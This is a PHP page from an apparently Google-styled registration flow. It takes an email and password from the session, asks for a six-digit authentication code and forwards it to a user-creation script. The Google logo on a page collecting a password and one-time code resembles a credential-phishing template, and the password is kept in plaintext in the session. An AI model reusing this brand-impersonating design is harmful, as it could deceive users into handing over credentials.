<?php
require_once "language.php";

if (!isset($_SESSION["register_email"])) {
    header("Location: register.php");
    exit;
}

if (!isset($_SESSION["register_password"])) {
    header("Location: register-password.php");
    exit;
}

$email = $_SESSION["register_email"];
$password = $_SESSION["register_password"];

$user_code = "";
$error = "";

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    $user_code = trim($_POST["user_code"] ?? "");

    if (empty($user_code)) {
        $error = $t["enter_code"];

    } else {

        $_SESSION["register_user_code"] = $user_code;

        header("Location: create-user.php");
        exit;
    }
}
?>

<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title><?php echo htmlspecialchars($t["verify_code"]); ?></title>

    <link rel="stylesheet" href="style.css">
</head>

<body>

<main class="page">

    <section class="card" aria-label="Verify authentication code">

        <div class="brand">
            <img class="logo" src="google-logo.png" alt="Logo">
        </div>

        <div class="content">

            <div class="intro">

            <h1><?php echo htmlspecialchars($t["welcome"]); ?></h1>

                <p>
                    <?php echo htmlspecialchars($email); ?>
                </p>

            </div>

            <form method="post">

                <div class="user-code-field <?php echo !empty($error) ? 'error' : ''; ?>">
                    <input
    id="user-code"
    name="user_code"
    type="text"
    inputmode="numeric"
    pattern="[0-9]{6}"
    maxlength="6"
    autocomplete="one-time-code"
    value="<?php echo htmlspecialchars($user_code); ?>"
>

<label for="user-code">
    <?php echo htmlspecialchars($t["authentication_code"]); ?>
</label>

                    <?php if (!empty($error)): ?>

                        <div class="error-message">
                            <span>!</span>
                            <?php echo htmlspecialchars($error); ?>
                        </div>

                    <?php endif; ?>

                </div>

                <br>
                <br>
                <div class="button-container2">
                    <button class="button2" type="submit"><?php echo htmlspecialchars($t["resend_code"]); ?></button>
                           <button class="button3" type="submit">
    <?php echo htmlspecialchars($t["next"]); ?>
</button>
                </div>

            </form>

        </div>

    </section>

    <footer>

    <div class="language-dropdown">

        <button
            type="button"
            id="language-button"
            class="language-button"
        >
            <span id="current-language">
                <?php echo htmlspecialchars($current_language_name); ?>
            </span>

            <span class="language-arrow">▲</span>
        </button>

        <div id="language-menu" class="language-menu">

            <?php foreach ($languages as $code => $name): ?>

                <div
                    class="language-option <?php echo $language === $code ? 'selected' : ''; ?>"
                    data-language="<?php echo htmlspecialchars($code); ?>"
                >
                    <?php echo htmlspecialchars($name); ?>
                </div>

            <?php endforeach; ?>

        </div>

    </div>


    <nav>
            <div class="nav-links-container">
            <button class="nav-links" type="submit"><a href="#"><?php echo htmlspecialchars($t["help"]); ?></a></button>
            <button class="nav-links" type="submit"><a href="#"><?php echo htmlspecialchars($t["privacy"]); ?></a></button>
            <button class="nav-links" type="submit"><a href="#"><?php echo htmlspecialchars($t["terms"]); ?></a></button>
        </div>

    </nav>

</footer>

</main>

<script src="user-code.js"></script>
<script src="language.js"></script>

</body>
</html>